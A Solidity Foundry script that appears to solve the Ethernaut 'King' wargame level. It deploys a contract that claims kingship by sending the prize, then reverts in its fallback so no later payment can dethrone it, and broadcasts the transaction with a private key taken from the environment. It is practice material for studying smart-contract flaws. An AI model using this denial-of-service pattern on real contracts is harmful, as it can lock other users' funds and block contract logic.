// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import "src/09-King.sol";



contract Exploit {
    constructor(King KingInstance) payable {
        (bool result,) = address(KingInstance).call{value: msg.value}("");
        require(result);
    }

    fallback() external payable {
        revert();
    }
}

contract Exp is Script {

    King public KingInstance = King(payable(0x1da110BB5f03f3aC7Acd253C73B4b3885e70eAbe));
    address hacker = vm.rememberKey(vm.envUint("PRIVATE_KEY"));
    address owner = vm.envAddress("MY_ADDRESS");
    //Exploit public exploit;

    function run() external {
        vm.startBroadcast(hacker);
        new Exploit{value: KingInstance.prize()}(KingInstance);

        vm.stopBroadcast();
    }
}